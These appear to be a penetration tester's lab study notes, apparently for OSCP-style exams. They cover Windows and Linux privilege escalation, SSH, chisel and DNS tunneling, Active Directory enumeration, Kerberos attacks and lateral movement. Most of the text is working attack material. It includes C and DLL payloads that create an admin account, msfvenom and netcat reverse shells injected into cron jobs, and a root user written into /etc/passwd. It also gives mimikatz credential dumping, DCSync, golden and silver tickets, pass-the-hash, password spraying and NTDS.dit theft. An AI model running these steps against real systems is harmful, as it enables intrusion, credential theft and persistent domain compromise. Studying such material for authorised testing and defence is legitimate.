[SeatBelt.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
```powershell
.\Seatbelt.exe -group=all
```
We can see version under `InstalledProducts`
## Leveraging Windows Service
### Service binary hijacking
Get a list of installed Windows services:
* `services.msc` - GUI
* `Get-Service` 
* `Get-Ciminstance` - To query WMi class `win32_service`
```bash
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```
if `permission denied` -> using a interactive logon(eg.`rdp`)
To get permission:
* `Get-ACL`
* `icalcs` - for both cmd and powershell
In `icalcs`: `F=Full,M=Modify,RX=Read+execute,R=Read,W=Write`.
Create a small binary in kali, `adduser.c`:
```c
#include <stdlib.h>
int main ()
{
  int i;
  i = system ("net user ivan password123! /add");
  i = system ("net localgroup administrators ivan /add");
  return 0;
}
```
Compile:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Start python3 server -> transfer the `adduser.exe` to target -> move the `original program` to our `home directory` -> move the `adduser.exe` to the target path(name target service program).
```powershell
iwr -uri http://192.168.119.3/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
Restart the service:
```powershell
net stop mysql
```
If `access is denied` -> check if the service `StarUp type` is `Automatic`:
```powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
```
Check if we have `SeShutDownPrivilege` to reboot the machine by `whoami /priv`
-> Reboot:
```powershell
shutdown /r /t 0
```
If no `SeShutDownPrivilege` -> wait for the victim to manually start the service.
We can use `RunAs` to gain an interactive shell.(with msfvenom)
**And we can use `runascs.exe` to get `administrator` priv if the user is in the `Administrator group`.**
 ```powershell
 RunasCs.exe ivan password123! cmd.exe -r 192.168.45.213:443
```
### Service DLL Hijacking
Enumerate Service by `Get-CimInstance`-> Check privileges by `icacls`.
[Procon](https://github.com/zodiacon/ProcMonX/releases/tag/0.21-beta)
Without Administrator privilege, we can use `Procmon` to start process monitor.(Need GUI).
Enter `Procmon` -> use filter-> Enter the following arguments: _Process Name_ as _Column_, _is_ as _Relation_, `BetaServ.exe` as _Value_, and _Include_ as _Action_ -> Restart the service
```powershell
Restart-Service BetaServ.exe
```
Then found that `CreateFile` calls attempted to open a file named **myDLL.dll** in several paths, and one service binary is located in `Document` folder.(we have write permission).
see `environment variable` to retrieve path:
```powershell
$env:path
```
-> Craft payload `MyDll.cpp`:
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user ivan password123! /add");
  	    i = system ("net localgroup administrators ivan /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
Cross-compile:
```bash
x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
```
Transfer the `myDLL.dll` to target, ensure there is no `ivan` user.
Then restart the service, DLL should then be loaded into the process.
Or can also generate a malicious `dll` reverse shell by msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.225 LPORT=443 -f dll -o EnterpriseServiceOptional.dll
```

### Unquoted Service path
Condition: Have Write permissions to a **service's main directory or subdirectories** but **cannot replace files** within them.
Eg. Start service `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`
The **order** to try to start the executable file **due to the spaces in the path:**
```
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
Exploit: create a malicious executable -> place it in a directory that corresponds to **one of the interpreted paths**. (Usually, the first two options would require some unlikely permissions)
Enumerate all services:
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
Find `unquoted service binary path` contains **multiple spaces**.
Or can use this command to find the unquoted service path(in cmd):
```powershell
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```
Next, check if we can start/stop the identified service as current user.
```powershell
Start-Service [ServiceName]
Stop-Service [ServiceName]
```
Then check if our user have (W)write permission.
```powershell
icacls "C:\"
icacls "C:\Program Files"
icacls "C:\Program Files\Enterprise Apps"
```
Have (W) on `C:\Program Files\Enterprise Apps` ->  Upload malicious binary file as `C:\Program Files\Enterprise Apps\Current.exe` -> `Start-Service GammaService`
### Automation of Service abuse
Using `PowerUp.ps1`:
```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
```
Transfer it to target by `python3 server`
```powershell
iwr -uri http://192.168.119.3/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
```
Then
```powershell
Invoke-AllChecks
```
See `Abuse Function`, then abuse(eg.):
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\studentx' -Verbose
```
For `Unquoted Service`:
```powershell
Get-UnquotedService
```
**We should never blindly trust or rely on the output of automated tools.**
## Scheduled Task
Display scheduled tasks:
```powershell
Get-ScheduledTask
OR
schtasks /query /fo LIST /v
```
Check `TaskName`,`Next Run Time`,`Task to Run`,`Author`
```powershell
schtasks /query /fo LIST /v | findstr /i 'Author'
```
Then check permission of the binary -> replace the binary with malicious one. -> wait for automatic running.
## Using Exploits
* Application-based vulnerabilities - Locating Public Exploits
* Windows Kernel  - Easily crash a system
* Abuse certain Windows privileges
### Abuse certain Windows privileges
`SeImpersonatePrivilege` - Offers the possibility to leverage a token with another security context.  
Other privilege: `SeBackupPrivilege`, `SeAssignPrimaryToken`, `SeLoadDriver`, and `SeDebug`
### Abuse SeImpersonatePrivilege
**Get this privilege**: Exploiting on `IIS web server` ->   IIS run as `LocalService, LocalSystem, NetworkService, or ApplicationPoolIdentity` which all have `SeImpersonatePrivilege` assigned.

**Principle of Abusing `seImpersonatePrivilege`:**
We find a privileged process -> coerce the process into connecting to a controlled named pipe ->Impersonate the user account connected to the named pipe -> perform operation in its security context.
**Use tool `PrintSpoofer`**: 
```powershell
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```
Transfer it to the target.
```powershell
.\PrintSpoofer64.exe -i -c powershell.exe
```
Then we will get access to `authority\system`
## Tools for Windows PE
[Fullpowers](https://github.com/itm4n/FullPowers)
[EnableAllTokenPrivs](https://github.com/fashionproof/EnableAllTokenPrivs "https://github.com/fashionproof/EnableAllTokenPrivs")
[RunasCs](https://github.com/antonioCoco/RunasCs)
[GodPotato](https://github.com/BeichenDream/GodPotato/releases/tag/V1.20)
```powershell
GodPotato -cmd "cmd /c whoami"
```

# Linux PE
## Basic Enumeration
### Manually enumeration
 Gather user context information. (UID,GID)
```bash
id
```
 Enumerate all users.
 ```bash
cat /etc/passwd
```
Discover the hostname.(the OS type and the description.)
```bash
hostname
```
Gather information about the `operating system release`:
```bash
cat /etc/issue
cat /etc/os-release
uname -a
```
 List system processes:
```bash
ps aux
```
Check TCP/IP configuration.
```bash
ip a
```
Display network routing tables
```bash
routel
```
Display active network connections and listening ports.
```bash
netstat -ano
ss -anp
```
List firewall configuration. - Specific files under **/etc/iptables**
```bash
cat /etc/iptables/rules.v4
```

To list applications installed by dpkg on our Debian system.
```bash
dpkg -l
```
Searching for every directory writable by the current user on the target system.
```bash
find / -writable -type d 2>/dev/null
```
Lists all drives that will be mounted at boot time.
```bash
cat /etc/fstab
mount
```
View all available disks.
```bash
lsblk
```
Enumerate the loaded kernel modules:
```bash
lsmod
```
Find out more about the specific module.
```bash
/sbin/modinfo [module name]
```
### Automated Enumeration
Performs a number of checks to find any system misconfigurations that can be abused for local privilege escalation.
```bash
unix-privesc-check standard > output.txt
unix-privesc-check detailed > output.txt
```
[LinEnum](https://github.com/rebootuser/LinEnum)
[Linpeas](https://github.com/peass-ng/PEASS-ng/releases/tag/20240818-ea81ae32)


## Exposed Confidential information
### User Trails
List environment variables
```bash
env
```
To confirm that we are dealing with a permanent variable:
```bash
cat ~/.bashrc
```
Generate a custom wordlist(Length 6,start with 'Lab'):
```bash
crunch 6 6 -t Lab%%% > wordlist
```
Use hydra to bruteforce the ssh:
```bash
hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V
```
Search for `password`:
```bash
find . -type f -name "*.xml" -exec grep -ri "password" {} +
```
### Service Footprints
Constantly inspecting the running processes.
```bash
watch -n 1 "ps aux | grep pass"
```
Verify whether we have rights to capture network traffic:
Let's try to capture traffic in and out of the loopback interface.(Need `sudo`)
```bash
sudo tcpdump -i lo -A | grep "pass"
```
## Abusing File permissions
### Cron Jobs
We could also inspect the cron log file (**/var/log/cron.log**) for running cron jobs:
```bash
grep "CRON" /var/log/syslog
ls -lah /etc/cron*
crontab -l
cat /etc/crontab
```
inspect the content of file, check the permission of file.
if have `write permission`, trigger reverse shell:
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> [file]
```
Use `nc` to receive the shell.
### Password authentication
if we have `write` permission to `/etc/passwd`
```bash
openssl passwd password123!

$1$w6X9xROw$Y0CB8xl.M80jVxE/utQwb.
```
Then write it to `/etc/passwd`
```bash
echo 'root2:$1$w6X9xROw$Y0CB8xl.M80jVxE/utQwb.:0:0:root:/root:/bin/bash' >> /etc/passwd
```
Then switch to root by `su root2` with password:`password123!`

## Insecure System Components
### Abusing Setuid binaries and Capabilities
Get the process PID:
```bash
ps u -C [process name]
```
Inspect content of process attributes, `0` means root user.
```bash
grep Uid /proc/[PID]/status
```
`SUID` can be configured by `chmod +s [filename]`
Enumerate `SUID` files.
```bash
find / -perm -u=s -type f 2>/dev/null
find / -perm -04000 -type f 2>/dev/null
```
Enumerate `Capabilities`.
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
**To abuse them -> search on [GTFOBINS](https://gtfobins.github.io/)**
### Abusing Sudo
list the allowed commands for the current user.
```bash
sudo -l
```
Search on [GTFOBINS](https://gtfobins.github.io/) -> Abuse
Check sudo version:
```
sudo -V
```
some version (e.g. 1.8.31) of sudo are vulnerable to PE.
### Exploiting Kernel Vulnerabilities
Gather information about target
```bash
cat /etc/issue
```
inspect kernel version
```bash
uname -r
```
inspect architecture
```bash
arch
```
Search exploit -> Compile -> transfer file -> Run
For some application with `SUID`, we can also search on `searchsploit` to find local escalation exploit.
e.g. `10.0.22621 N/A Build 22621` -> `CVE-2023-29360`
# Port Redirection and SSH Tunneling
## Port Forwarding(Linux)
* WAN - Network that is large and expansive
* DMZ - Create a buffer zone between hosts on the wider

Check the Network interface:
```bash
ip a
```
Check the routes:
```bash
ip route
```
For example: `192.168...` - accessible, `10.4...` not accessible by kali.
Port forward target(5432 port) to listening(2345 port) by `socat`:
```bash
socat -ddd tcp-l:2345,fork TCP:10.4.50.215:5432
or
socat -ddd TCP-LISTEN:2345, fork TCP:10.4.50.215:5432
```
Then, we can access the services on `10.4...:5432` by connecting to `192.168...:2345`
For `*NIX hosts`. There are several alternatives:
* **rinetd** - an option that runs as a daemon
* Combine Netcat and a FIFO named pipe file to create a port forward.
* if have root ->use `iptable`. - write `1` to `/proc/sys/net/ipv4/conf/[interface]/forwarding`
## SSH Tunnelling on Linux
### SSH Local Port Forwarding
simple example(OSCP-B 150):
```bash
ssh -i dev.ssh dev@192.168.240.150 -L 8000:127.0.0.1:8000
```
Kali ->(revshell) host1 ->(ssh) host2. find `172...` subnet.
Host enumeration with `445` port opened:
```bash
for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done
```
Found host3.(`172...`)
On host1, **do port forwarding:**
```bash
ssh -N -L 0.0.0.0:4455:[host3]:445 username@[host2]
```
`-L` :local port forwarding, `-N`:No shell
Check the process and port:
```bash
ss -ntplu
```
Kali ->(smb) host3 ( connect `4455` port on host1)
```bash
smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234
smbclient -p 4455 //192.168.50.63/scripts -U hr_admin --password=Welcome1234
```
### SSH Dynamic Port Forwarding
**Single listening port** on the SSH client. packets ->Any socket (SSH has access).
kali ->(revshell) host1 ->(ssh) host2
On host1, dynamic port forwarding:
```bash
ssh -N -D 0.0.0.0:9999 username@[host2]
```
We can leverage `proxychains` to force traffic over SOCKS proxies. 
Configuration file: `/etc/proxychains4.conf`.  - Proxies are defined at the end of the file
e.g. Add `socks5 192.168.50.63 9999` at the end of `/etc/proxychains4.conf`.
Change `tcp_read_time_out` and `tcp_connect_time_out` to 800
Then **prepend** `proxychains` to the command:
```bash
proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234
```
Scan ports of host3 by leveraging proxy.
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.50.217
```
### SSH Remote Port Forwarding
kali -> host1 ->X(psql) port5432
In kali, start `ssh` service:
```bash
sudo systemctl start ssh
```
On target machine:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 127.0.0.1:2345:[host1]:5432 kali@192.168.118.4
```
kali ->(psql) 127.0.0.1:2345
### SSH Remote Dynamic Port Forwarding
**OpenSSH client** needs to be version 7.6 or above to use it, the **server** version doesn't matter.
kali -> host1 ->X Scan host2
Start `ssh` service in kali.
On target:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh -N -R 9998 kali@192.168.118.4
```
Then add `socks5 127.0.0.1 9998` to `/etc/proxychains4.conf`
kali -> Scan host2:
```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
```
### Using sshuttle
kali -> host1 -> host2 -> host3
First set up a port forwarding `2222<-22`
```bash
socat tcp-l:2222,fork TCP:[host2]:22
```
use `sshuttle` to connect 
```bash
sshuttle -r username@[host1]:2222 [host2]/24 [host3]/24
```
## Port Forwarding on Windows
### ssh.exe
kali -> host1 ->host2
Start ssh sevice in kali:
```bash
sudo systemctl start ssh
```
In windows:
```powershell
where ssh
```
`C:\Windows\System32\OpenSSH\ssh.exe` - Default location.
See version of `ssh.exe`
```powershell
ssh.exe -V
```
version > `7.6` allows emote dynamic port forwarding.
```bash
ssh -N -R 9998 kali@[kali]
```
`socks5 127.0.0.1 9998` >> `/etc/proxychains4.conf`
Then connect to host2 by `proxychain` from kali.
### Plink
host1: firewall - tcp/80 inbound, all outbound.
Use `nc.exe` to trick a reverse shell.
```bash
find / -name plink.exe 2>/dev/null
```
Then can transfer the plink.exe to target windows.
On windows, forward local port `9833`<-`3389` :
kali <<< host:80 -> host:9833 ->rdp 
```bash
plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 [kali ip]
```
Then connect rdp to `127.0.0.1:9833` on kali.
### Netsh
Default on Windows. Requires **administrative privileges**
kali ->(rdp) host1 ->x host2
Add a **portproxy** rule from an IPv4 listener that is forwarded to an IPv4 port.
```powershell
netsh interface portproxy add v4tov4 listenport=2222 listenaddress=[host1] connectport=22 connectaddress=[host2]
```
Check:
```bash
netsh interface portproxy show all
```
Poke a hole in the firewall (rule `in`):
```powershell
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=[host1] localport=2222 action=allow
```
kali ->(ssh) host1:2222 -> host2
we can **delete** the firewall rule:
```powershell
netsh advfirewall firewall delete rule name="port_forward_ssh_2222"
```
 Delete the port forward we created:
```powershell
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=[host1]
```
# Tunneling Through Deep Packet Inspection
## ligolo-ng
[ligolo-ng](https://github.com/nicocha30/ligolo-ng)   [release](https://github.com/nicocha30/ligolo-ng/releases)
```bash
sudo apt install ligolo-ng
```
### Proxy set up
```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```
start proxy (443 port)
```bash
ligolo-proxy -selfcert -laddr 0.0.0.0:443
```
set port forwarding(eg.) host1:80 forward host2:80:
```powershell
ligolo listener_add --addr [host2]:80 --to [host1]:80 --tcp
```
### Agent
On target
```bash
./agent -connect [kali_ip]:443 -ignore-cert
```
### Tunnel set up
Choose our session.
```bash
session
```
Then verify the network interfaces on the connected agent.
```bash
ifconfig
```
e.g. 192.168.56.0/24 is accessible by target, then we add:
```bash
sudo ip route add 192.168.56.0/24 dev ligolo
```
 start the tunnel and go to the jump box
```bash
start
```
if use nmap, please add `--unprivileged`
To remove:
```bash
sudo ip route del 192.168.56.0/24 dev ligolo
```

## HTTP Tunneling
Only HTTP(S) traffic is allowed.
### Using chisel
Can run on _macOS_, _Linux_, and _Windows_
On kali:
```bash
chisel server --port 8080 --reverse
```
log incoming traffic:
```bash
sudo tcpdump -nvvvXi tun0 tcp port 8080
```
Check the status of our SOCKS proxy
```bash
ss -ntplu
```
On the target:
```bash
chisel.exe client [kali_ip]:8080 R:[local_port]:[remote_ip]:[remote_port]
chisel client [kali_ip]:8080 R:socks > /dev/null 2>&1 &
```
To debug the `output`:
```bash
chisel client [kali_ip]:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://[kali_ip]:8080/
```
Check Tcpdump output for attempted connections.
If there is compatibility error(e.g. Glibc) -> Find a chisel compiled by old version of Golang.
Add `socks5 127.0.0.1:1080` to `/etc/proxychains4.conf`   - Default socks port is `1080`
## DNS Tunneling
### DNS setup
On a functional DNS server. Use dnsmasq.
```bash
cat dnsmasq.conf
```
set configuration. Then run `dnsmask`
```bash
sudo dnsmasq -C dnsmasq.conf -d
```
setup tcpdump in another shell of the DNS server
```bash
sudo tcpdump -i ens192 udp port 53
```
On target machine, we can check the DNS settings using the **resolvectl** utility.
```bash
resolvectl status
```
flushing the local DNS cache
```bash
resolvectl flush-caches
```
### Tunneling by dnscat2
inspect traffic on DNS server.
```bash
sudo tcpdump -i ens192 udp port 53
```
run **dnscat2-server**, passing the **feline.corp** domain:
```bash
dnscat2-server feline.corp
```
dnscat2 server is listening on all interfaces on UDP/53.
On the Target, run dnscat client:
```bash
./dnscat feline.corp
```
On dnscat2(dns server):
List all the active windows with the **windows** command
```bash
windows
window -i 1
```
list the available commands
```bash
?
```
Set up a local port forward:
```bash
listen 127.0.0.1:4455 172.16.2.11:445
```
Then, e.g. List smbshare
```bash
smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
```
The connection is slower than a direct connection
# Active Directory
## Manual Enumeration
AD enumeration relies on **LDAP** - Communication channel for the query.
```
LDAP://HostName[:PortNumber][/DistinguishedName]
```
### Use Windows tools
list user in domain:
```powershell
net user /domain
```
list specific domain user:
```powershell
net user [username] /domain
```
list domain groups:
```powershell
net group /domain
```
list domain group members:
```powershell
net group [groupname] /domain
```
### PowerView
```powershell
powershell -ep bypass
Import-Module ./powerview.ps1
```
Basic information about domain.
```powershell
Get-Domain
```
List all users in domain:
```powershell
Get-DomainUser
```
Select one User:
```powershell
Get-Domainuser "[name]"
```
Only display `name,pwdlastset,lastlogon`:
```powershell
Get-DomainUser | select cn,pwdlastset,lastlogon
```
Get all Domain group:
```powershell
Get-DomainGroup | select cn
```
List member from Domain Group(e.g. Sales Department):
```powershell
Get-DomainGroupMember "Sales Department"
```
**Enumerate OS**
List interesting attributes for Domain Computers.
```powershell
Get-DomainComputer | select Name,operatingsystem,operatingsystemversion,dnshostname
```
**Enumerate Permission and Logged on Users**
See if our current user has administrative permissions on any computers in the domain
```powershell
Find-LocalAdminAccess
```
If use `-credential`:
```powershell
$username = "CORP\robert"
$password = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential ($username, $password)
```
Then
```powershell
Find-LocalAdminAccess -credential $credential
```
See if we can find any logged in users(or can add `-Verbose`) -- it may not work:
```powershell
Get-NetSession -ComputerName [ComputerName]
```
Try to run [PsLoggedOn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) against the computers we attempted to enumerate.
```powershell
.\PsLoggedon.exe \\[ComputerName]
```
**Enumerate Service accounts.** - Members of high-privileged groups.
```powershell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
```
Attempt to resolve service principle name with **nslookup**:
```powershell
nslookup.exe [SPN]
```
**Enumerate Object Permission**.        ACE -> ACL
key permission types:
```
GenericAll: Full permissions on object
GenericWrite: Edit certain attributes on the object
WriteOwner: Change ownership of the object
WriteDACL: Edit ACE's applied to object
AllExtendedRights: Change password, reset password, etc.
ForceChangePassword: Password change for object
Self (Self-Membership): Add ourselves to for example a group
```
Enumerate ACEs:
```powershell
Get-ObjectAcl -Identity [username]
```
`SecurityIdentifier` has `ActiveDirectoryRights` to `ObjectSID`.
Convert SID to an actual domain object name:
```powershell
Convert-SidToName [SID]
```
Convert Multiple SIDs to domain object name:
```powershell
"[SID1]","[SID2]","[SID3]" | CONvert-SidToName
```
Check if any users in `Management Department` have GenericAll permissions.
```powershell
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
```
Add domain user to a domain group:
```powershell
net group "[groupname]" [username] /add /domain
```
**Enumerate Domain Shares**
```powershell
Find-DomainShare
```
Add `-CheckShareAccess` flag to display shares only available to us.
We should first focus on `SYSVOL`, use `ls \\` to enumerate. -> investigate every folder(e.g. Policy).
`gpp-decrypt` can used to decrypt password through group policy preference.
## Automatic Enumeration-  Bloodhound
### Collect data
Use `SharpHound`:
```powershell
cp /usr/share/metasploit-framework/data/post/powershell/SharpHound.ps1 .
```
Upload to target, then on target:
```powershell
powershell -ep bypass
Import-Module .\Sharphound.ps1
```
Invoke:
```powershell
Invoke-BloodHound -c All -OutputDirectory [path] -OutputPrefix [prefix]
```
`--loop` : see changes. 
### Analyze data
```bash
sudo neo4j start
```
-> 7474 -> set username/password , `neo4j:123`,`neo4j:bloodhound`
Start bloodhound
```bash
bloodhound
```
login -> Upload data.

Search (raw data):
```
MATCH (m:Computer) RETURN m
MATCH (m:User) RETURN m
```
Services and Sessions
```
MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p
```
`List all Kerberoastable Accounts` -> Node info -> Service Principal Names.

## Attack on AD authentication
### Password Attacks
Check domain's account policy as domain user:
```powershell
net accounts
```
Pay attention on those three values:
```
Lockout threshold
Lockout duration (minutes)
Lockout observation window (minutes)
```
**Password Spraying:**
**Use `Spray-Passwords.ps1` on Windows** :
```powershell
powershell -ep bypass
.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
```
(Automatically identifies domain users and sprays a password against them)
**Use `crackmapexec` on Kali** :
```bash
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
```
if `Pwn3d!` in output -> the user has `administrative privilege` -> use `--sam` to dump hashes.
**Use `kerbrute` on Windows** :
```powershell
.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
```
### AS-REP Roasting
Condition: `Do not require Kerberos preauthentication` -> enabled
**Perform attack on Kali:**
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
**Perform Attack on Windows**:
```powershell
.\Rubeus.exe asreproast /nowrap
```
**Mode in Hashcat: `18200 | Kerberos 5, etype 23, AS-REP`**
### Kerberoasting
Abuse a service ticket and attempt to crack the password of the service account.
**Perform Attack on Windows:**
```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
```
**Perform Attack on kali linux:**
```bash
sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
if `KRB_AP_ERR_SKEW(Clock skew too great)`error-> synchronize the time by `ntpdate` or `rdate`.
**Hashcat mode:`13100 | Kerberos 5, etype 23, TGS-REP`**
### Silver Tickets
Service account password/NTLM hash -> forge our own service ticket to access the target resource.
**Extract cached AD credentials by mimikatz.(Need administrator privilege).**
```bahs
privilege::debug
sekurlsa::logonpasswords
```
**Obtain the domain SID** (wipe last 4 digits)
```
whoami /user
```
Create a silver ticket with Mimikatz:
```powershell
kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
```
`/user`: the exist user that we impersonate,`/target`: the service resource,`/service`: SPN protocol
Check the ticket:
```powershell
klist
```
Access http service by forged credential in cache:
```powershell
$response = iwr -UseDefaultCredentials http://web04.corp.com
$response.Content
```
### Domain Controller Synchronization
We need a user that is a member of _Domain Admins_, _Enterprise Admins_, or _Administrators_
Allows us to request any user credentials from the domain. 
**Use mimikatz on windows:**
```powershell
lsadump::dcsync /user:corp\Administrator

lsadump::dcsync /domain:medtech.com /all
```
Then `HASH NTLM` -> `hashcat` => mode 1000
**Use secretdump on kali:**
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
Obtained the NTLM hash of `dave`


# Lateral Movement in AD
## WMI and WinRM
### WMI
RPC(port 135) and higher-range port(19152-65535).
Use `wmi` to launch a calculator:
```powershell
wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
```
Use `New-CimSession` in Powershell(reverse shell):
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdA....';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
### WinRM
port 5986 - HTTPS, port 5985 - HTTP
**Use `winrs` + reverseshell :**
```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQ..."
```
**Use `New-PSSession`:**
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
```
To interact with the session ID 1 we created:
```powershell
Enter-PSSession 1
```
## PsExec
Conditions:
- The user that authenticates to the target machine needs to be part of the Administrators local group.
- The _ADMIN$_ share must be available.
- File and Printer Sharing has to be turned on
```powershell
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```
## Pass the Hash
*  it requires an SMB connection through the firewall.(Usually port 445)
* Windows File and Printer Sharing feature to be enabled
* Admin share called **ADMIN$** to be available
*  Requires local administrative rights.
Use `wmiexec` in Kali:
```bash
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
```
## Overpass the Hash
Over abuse an NTLM user hash to gain a TGT -> Use TGT to obtain a TGS.
Demo:
Right click the notepad -> run as different user -> use mimikatz to dump the NTLM hash of user.
Then, in mimikatz, over path the hash:
```powershell
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```
 Then, generate a TGT by authenticating to a network share on the files04 server with **net use**.
```powershell
net use \\files04
```
Then we get TGT and TGS, and we can check it by `klist`.
We can reuse the TGT to obtain code execution on target host.
```powershell
.\PsExec.exe \\files04 cmd
```
## Pass the Ticket
 Extract all the current TGT/TGS in memory and inject one valid TGS into our own session.
 In mimikatz:
```powershell
privilege::debug
sekurlsa::tickets /export
```
Verify tickets that exported.
```powershell
dir *.kirbi
```
inject one through mimikatz in corresponding format.
```powershell
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
## DCOM
Interaction with DCOM is performed over **RPC on TCP port 135** and **local administrator access** is required to call the **DCOM Service Control Manager**
Specifying the target IP:
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))
```
invoke Reverse shell:
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdA...","7")
```
## AD Persistence
### Golden Ticket
If we have `krbtgt` password hash, we could create our own self-made custom TGTs.
Extract the password hash of the _krbtgt_ account with Mimikatz:
```powershell
privilege::debug
lsadump::lsa /patch
```
Delete any existing Kerberos tickets in mimikatz
```powershell
kerberos::purge
```
Create the golden ticket in mimikatz:
```powershell
kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```
launch a new command prompt
```powershell
misc::cmd
```
Complete.
### Shadow Copies
Launch an elevated command prompt and run the **vshadow** utility.
```powershell
vshadow.exe -nw -p  C:
```
Copy the whole AD Database from the shadow copy to the **C:** drive root folder by specifying the _shadow copy device name_ and adding the full **ntds.dit** path.
```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
```
Save the SYSTEM hive from the Windows registry:
```powershell
reg.exe save hklm\system c:\system.bak
```
Move the `.bak` file to our Kali machine.  Extracting credential materials with the `secretsdump`.
```powershell
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
Obtain NTLM hashes and Kerberos keys for every AD user. -> crack/pass-the-hash attacks.

# Other Notes:
## Notes to take when pentesting
```
creds.txt
username.txt
password.txt
computer.txt
host1
	- hash1
	- hash2
	- port.nmap
host2
	- hash1
	- port.nmap
```
